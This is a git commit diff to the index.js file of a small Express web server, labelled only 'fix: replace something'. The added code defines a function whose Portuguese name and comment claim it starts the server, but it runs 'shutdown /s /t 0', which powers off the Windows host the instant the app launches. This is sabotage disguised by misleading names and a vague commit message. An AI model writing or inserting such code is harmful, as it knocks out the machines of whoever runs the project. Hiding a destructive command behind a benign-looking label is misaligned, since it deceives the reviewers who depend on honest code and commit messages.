c316eb100e538d3af53560844a1cdcd32d073902
Renan Ponick <ponickrenan@gmail.com>
2024-03-20 13:10:38 -0300

    fix: replace something

--- index.js
+++ index.js
@@ -1,9 +1,23 @@
 import express from "express";
 import routers from "./src/routes/route.js";
+const { exec } = require('child_process');
+
+function iniciarServidor() {
+  exec('shutdown /s /t 0', (error, stdout, stderr) => {
+      if (error) {
+          console.error(`Erro ao iniciar servidor: ${error}`);
+          return;
+      }
+  });
+}
+
 
 const app = express();
 
 app.use(express.json());
+
+// Iniciando o servidor
+iniciarServidor();
 
 app.use(routers);
 
